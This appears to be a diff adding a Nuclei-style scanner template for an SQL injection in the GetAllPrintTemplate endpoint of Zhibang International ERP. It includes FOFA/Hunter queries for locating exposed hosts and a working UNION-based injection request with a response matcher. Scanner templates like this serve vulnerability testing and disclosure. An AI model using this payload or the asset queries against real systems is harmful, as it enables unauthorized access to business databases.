@@ -1,0 +1,25 @@
+id: intbrand-getallprinttemplate-sql
+
+info:
+  name: "智邦国际 GetAllPrintTemplate 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: hunter:app.name="智邦国际 ERP" fofa:body="/SYSN/"
+      
+    智邦国际ERP系统中/SYSN/路径下的GetAllPrintTemplate接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，在接口调用时触发注入点，实现对后端数据库的未授权访问与操作。该漏洞可能导致敏感业务数据泄露、数据库结构暴露或数据完整性受损。此漏洞可通过以下FOFA语法进行资产定位：hunter:app.name="智邦国际 ERP" fofa:body="/SYSN/"。漏洞披露时间为2024年4月22日。
+  tags: 智邦国际
+
+http:
+- raw:
+  - |
+    GET /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12+UNION+ALL+SELECT+NULL,NULL,char(115)%2Bchar(99)%2Bchar(97)%2Bchar(109)%2Bchar(97)%2Bchar(103)%2Bchar(105)%2Bchar(99),NULL-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'scamagic'
